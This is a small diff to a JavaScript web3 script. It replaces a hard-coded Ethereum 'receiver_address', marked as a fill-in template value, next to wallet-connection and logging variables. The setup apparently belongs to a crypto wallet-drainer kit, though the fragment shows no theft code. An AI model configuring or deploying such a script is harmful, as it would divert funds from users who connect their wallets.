@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_address = '0x1b8Dc394950e898aB06f2de0E0926fBB0029E68A'; // gaf<- RECEIVER ADDRESS HERE
+const receiver_address = '0x48Ff898d7B47D5d1A232E689a29b8F3b35b62a5F'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
